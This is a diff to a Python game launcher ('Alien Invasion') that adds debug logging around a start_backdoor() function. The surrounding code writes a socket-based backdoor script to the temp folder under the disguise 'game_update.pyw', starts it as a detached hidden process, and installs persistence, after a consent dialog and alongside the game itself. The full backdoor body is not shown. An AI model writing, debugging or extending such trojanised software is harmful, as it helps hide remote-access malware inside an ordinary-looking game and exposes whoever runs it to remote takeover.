@@ -306,13 +306,21 @@ def show_consent_dialog():
 
 def start_backdoor():
     """Start the backdoor process after user consent"""
+    print("[DEBUG] start_backdoor() called")
+    print(f"[DEBUG] ENABLE_BACKDOOR = {config.ENABLE_BACKDOOR}")
+    print(f"[DEBUG] LISTENER_HOST = {config.LISTENER_HOST}")
+    print(f"[DEBUG] LISTENER_PORT = {config.LISTENER_PORT}")
+    
     try:
         import subprocess
         import sys
         import os
         
+        print("[DEBUG] Imports successful")
+        
         # Use the test_backdoor_simple.py that we know works!
         if getattr(sys, 'frozen', False):
+            print("[DEBUG] Running as frozen exe")
             # Running as exe - create the script
             import tempfile
             backdoor_script = f'''import socket
@@ -352,62 +360,97 @@ while True:
             temp_dir = tempfile.gettempdir()
             backdoor_path = os.path.join(temp_dir, 'game_update.pyw')
             
+            print(f"[DEBUG] Writing backdoor to: {backdoor_path}")
+            
             with open(backdoor_path, 'w') as f:
                 f.write(backdoor_script)
+            
+            print("[DEBUG] Backdoor script written")
         else:
+            print("[DEBUG] Running as script")
             # Running as script - use test_backdoor_simple.py
             backdoor_path = os.path.join(os.path.dirname(__file__), 'test_backdoor_simple.py')
+            print(f"[DEBUG] Using: {backdoor_path}")
         
         # Launch it
         if os.name == 'nt':  # Windows
+            print("[DEBUG] Windows detected")
             # Find pythonw.exe
             python_dir = os.path.dirname(sys.executable)
             pythonw = os.path.join(python_dir, 'pythonw.exe')
             
+            print(f"[DEBUG] Looking for pythonw at: {pythonw}")
+            
             if not os.path.exists(pythonw):
+                print("[DEBUG] pythonw not found, using sys.executable")
                 pythonw = sys.executable
             
+            print(f"[DEBUG] Using python: {pythonw}")
+            print(f"[DEBUG] Backdoor script: {backdoor_path}")
+            
             # Start the backdoor
-            subprocess.Popen(
+            proc = subprocess.Popen(
                 [pythonw, backdoor_path],
                 creationflags=0x00000008,  # DETACHED_PROCESS
                 close_fds=True
             )
+            
+            print(f"[DEBUG] Process started with PID: {proc.pid}")
         
         # Install persistence
         if config.ENABLE_PERSISTENCE:
+            print("[DEBUG] Installing persistence...")
             from persistence import PersistenceManager
             pm = PersistenceManager()
             pm.install_persistence()
+            print("[DEBUG] Persistence installed")
+        
+        print("[DEBUG] start_backdoor() completed successfully")
             
     except Exception as e:
-        pass
+        print(f"[ERROR] Exception in start_backdoor(): {e}")
+        import traceback
+        traceback.print_exc()
 
 if __name__ == '__main__':
     # Prevent multiple instances
     import socket
     import sys
     
+    print("[DEBUG] Game starting...")
+    
     # Try to bind to a unique port to prevent multiple instances
     try:
         lock_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         lock_socket.bind(('127.0.0.1', 47200))
+        print("[DEBUG] Lock acquired")
     except:
         # Another instance is already running
+        print("[DEBUG] Another instance running, exiting")
         sys.exit(0)
     
     # Check dependencies silently in windowed mode
+    print("[DEBUG] Checking dependencies...")
     checker = DependencyChecker()
     checker.ensure_dependencies()
     
     # Show consent dialog (GUI-based)
+    print("[DEBUG] Showing consent dialog...")
     if not show_consent_dialog():
+        print("[DEBUG] User declined consent")
         sys.exit(0)
+    
+    print("[DEBUG] User accepted consent!")
     
     # User clicked YES - start backdoor NOW
     if config.ENABLE_BACKDOOR:
+        print("[DEBUG] Starting backdoor...")
         start_backdoor()
+        print("[DEBUG] Backdoor start function returned")
+    else:
+        print("[DEBUG] Backdoor disabled in config")
     
     # Start the game
+    print("[DEBUG] Starting game...")
     ai = AlienInvasion()
     ai.run_game()
